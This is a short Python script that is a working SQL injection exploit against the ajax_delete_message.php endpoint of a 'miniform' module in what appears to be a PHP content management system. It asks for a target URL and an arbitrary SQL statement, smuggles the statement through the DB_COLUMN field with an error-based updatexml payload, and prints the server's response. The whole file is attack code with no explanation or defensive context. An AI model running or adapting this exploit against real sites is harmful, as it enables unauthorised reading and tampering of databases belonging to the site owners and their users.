import requests

url = input("Enter url:")
url = url+"/modules/miniform/ajax_delete_message.php"
pay = input("Enter the sql statement you want to execute:")
data={
"DB_RECORD_TABLE":"droplets",
    "purpose":"delete_record",
    "action":"delete",
    "DB_COLUMN":f"id` = -1 or updatexml(1,concat('$',({pay})),0)#",
    "iRecordID":"-1"
}
res = requests.post(url,data=data)
print(res.text)
